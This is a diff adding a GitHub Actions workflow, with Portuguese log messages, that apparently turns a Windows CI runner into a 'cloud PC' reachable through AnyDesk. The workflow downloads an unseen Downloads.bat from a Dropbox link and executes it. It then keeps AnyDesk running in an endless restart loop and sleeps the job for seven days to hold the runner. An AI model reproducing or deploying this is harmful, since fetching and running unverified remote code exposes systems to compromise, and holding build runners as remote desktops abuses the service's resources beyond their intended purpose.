@@ -1,0 +1,63 @@
+name: Windows Cloud PC - Anydesk (Optimized)
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Start Building...
+    runs-on: windows-latest
+    timeout-minutes: 10080  # Máximo permitido: 7 dias
+
+    steps:
+      - name: Downloading & Installing Essentials
+        shell: pwsh
+        run: |
+          Write-Host "Baixando script Downloads.bat..."
+          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/7eiczvgil84czu55dxep3/Downloads.bat?rlkey=wzdc1wxjsph2b7r0atplmdz3p&dl=1" -OutFile "Downloads.bat"
+          
+          Write-Host "Executando Downloads.bat..."
+          cmd /c Downloads.bat
+
+      - name: Log In To AnyDesk
+        shell: pwsh
+        run: |
+          if (Test-Path "start.bat") {
+            Write-Host "Iniciando AnyDesk com start.bat..."
+            cmd /c start.bat
+          } else {
+            Write-Host "⚠️ Arquivo start.bat não encontrado. Verifique o script Downloads.bat."
+          }
+
+      - name: Monitor and Restart AnyDesk if Needed
+        shell: pwsh
+        run: |
+          Write-Host "Monitorando AnyDesk a cada 5 minutos..."
+          while ($true) {
+            $process = Get-Process -Name "AnyDesk" -ErrorAction SilentlyContinue
+            if (-not $process) {
+              Write-Host "AnyDesk não está rodando. Reiniciando..."
+              if (Test-Path "start.bat") {
+                cmd /c start.bat
+              } else {
+                Write-Host "start.bat não encontrado durante o monitoramento."
+              }
+            }
+            Start-Sleep -Seconds 300
+          }
+
+      - name: Time Counter (Keep Runner Alive)
+        shell: pwsh
+        run: |
+          Write-Host "Mantendo a máquina ativa por 7 dias (604800 segundos)..."
+          Start-Sleep -Seconds 604800
+
+      - name: Clean Up Temporary Files
+        if: success()
+        shell: pwsh
+        run: |
+          Write-Host "Limpando arquivos temporários..."
+          if (Test-Path "Downloads.bat") {
+            Remove-Item Downloads.bat -Force
+          }
+          Write-Host "Limpeza completa."
